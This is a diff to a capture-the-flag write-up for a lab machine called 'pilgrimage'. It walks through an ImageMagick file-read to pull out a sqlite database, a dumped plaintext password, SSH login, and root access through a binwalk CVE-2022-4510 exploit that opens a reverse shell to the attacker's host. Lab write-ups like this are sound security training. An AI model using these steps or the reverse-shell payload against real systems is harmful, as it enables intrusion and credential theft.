@@ -145,5 +145,120 @@ Lastly, we will have to extract the contents of the downloaded image and convert
 ```
 # Obtain the hex output
 identify -verbose 64a8cf0bba3e3.png
+# Convert hex output to utf-8
 python3 -c 'bytes.fromhex(<hex output>).decode("utf-8")'
+```
+
+From the source code that we have extracted earlier, we notice that there is an sqlite database file at ```/var/db/pilgrimage```
+
+```
+function fetchImages() {
+  $username = $_SESSION['user'];
+  $db = new PDO('sqlite:/var/db/pilgrimage');
+  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
+  $stmt->execute(array($username));
+  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
+  return json_encode($allImages);
+}
+```
+We can then make use of the LFI to read the database file and download it to our local machine. We will use the steps described above to obtain the hex values of the file. However, we will have to make a tweak to the last command. Instead of using python3 to obtain the utf-8 value, we will have to use ```xxd``` to save the hex output into a file
+
+```
+# Obtain hex output
+identify -verbose <image file>
+# Save hex output into sqlite file
+echo "<hex>" | xxd -r -p > pilgrimage.sqlite
+```
+
+Next, we will then use sqlite3 to dumb the contents of the database file. From there, we are able to obtain the credentials for ```emily```
+
+```
+┌──(pentest)─(kali㉿kali)-[~/Desktop/pilgrimage/imagemagick-lfi-poc]
+└─$ sqlite3 store       
+SQLite version 3.39.4 2022-09-29 15:55:41
+Enter ".help" for usage hints.
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
+INSERT INTO users VALUES('emily','abigchonkyboi123');
+CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
+COMMIT;
+sqlite> 
+```
+
+# Obtaining user flag
+Using the credentials of ```emily``` that we have obtained earlier, we can gain SSH access and read the contents of the user flag.
+
+```
+┌──(pentest)─(kali㉿kali)-[~/Desktop/pilgrimage/imagemagick-lfi-poc]
+└─$ ssh emily@10.10.11.219
+emily@10.10.11.219's password: 
+Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+emily@pilgrimage:~$ cat /home/emily/user.txt
+<user flag>
+```
+
+# Privilege Escalation
+Looking at the processes that are running in the background, we manage to find a /usr/sbin/malwarecheck.sh that is running in the background
+
+```
+root         728  0.0  0.0   6816  2996 ?        Ss   04:06   0:00 /bin/bash /usr/sbin/malwarescan.sh
+```
+
+Checking the contents of malwarescan.sh, we realize that what this script is essentially doing is that when a new file is moved/copied to /var/www/pilgrimage.htb/shrunk, it checks if the file is either a executable script or microsoft executable and deletes them if they are
+
+```
+#!/bin/bash
+
+blacklist=("Executable script" "Microsoft executable")
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
+        binout="$(/usr/local/bin/binwalk -e "$filename")"
+        for banned in "${blacklist[@]}"; do
+                if [[ "$binout" == *"$banned"* ]]; then
+                        /usr/bin/rm "$filename"
+                        break
+                fi
+        done
+done
+```
+
+Checking the version of binwalk used, we realized that this version of binwalk is vulnerable to CVE-2022-4510
+```
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ /usr/local/bin/binwalk --help
+
+Binwalk v2.3.2
+Craig Heffner, ReFirmLabs
+https://github.com/ReFirmLabs/binwalk
+...
+```
+
+Using the script from [here](https://github.com/adhikara13/CVE-2022-4510-WalkingPath.git), we are able to create a vulnerable image that can create a reverse shell connection to our local listener
+
+```
+python3 walkingpath.py reverse test.png 10.10.16.2 3000
+```
+
+Uploading the file to /var/www/pilgrimage.htb/shrunk will then cause the reverse shell connection to be made to our listener
+
+```
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.16.2:443/binwalk_exploit.png
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ cp *.png *.sh
+```
+
+# Obtaining root flag
+
+```
+root@pilgrimage:~/quarantine# cat /root/root.txt
+cat /root/root.txt
+<redacted root flag>
 ```
